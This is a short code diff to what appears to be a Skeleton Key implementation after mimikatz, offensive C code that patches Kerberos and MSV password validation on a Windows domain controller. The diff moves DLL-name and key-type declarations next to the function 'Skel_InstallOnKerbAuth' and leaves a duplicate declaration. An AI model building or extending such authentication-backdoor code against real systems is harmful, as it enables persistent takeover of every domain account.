@@ -1,8 +1,7 @@
 #include "SkeletonKey.h"
 
 
-wchar_t newerKey[] = L"Kerberos-Newer-Keys";
-wchar_t kdcsvc[] = L"kdcsvc.dll", cryptdll[] = L"cryptdll.dll", msv1_0[] = L"msv1_0.dll";
+wchar_t cryptdll[] = L"cryptdll.dll", msv1_0[] = L"msv1_0.dll";
 
 typedef BOOL(WINAPI* PMSVPPASSWORDVALIDATE)(LPSTR unk1, DWORD unk2, PVOID NTstruct, PLM_OWF_PASSWORD pRealPassword, PDWORD unk3, PUCHAR unk4, PVOID unk5);
 typedef NTSTATUS(WINAPI* PCDLOCATECSYSTEM)(ULONG Type, PKERB_ECRYPT* ppCSystem);
@@ -358,6 +357,10 @@ unsigned char ds_attr_not_found[] =
 * 
 * mimikatz newer kerberos keys patching
 * 
+
+wchar_t newerKey[] = L"Kerberos-Newer-Keys";
+wchar_t kdcsvc[] = L"kdcsvc.dll", cryptdll[] = L"cryptdll.dll", msv1_0[] = L"msv1_0.dll";
+
 BOOL Skel_InstallOnKerbAuth(DWORD processID)
 {
 	BOOL status = FALSE;
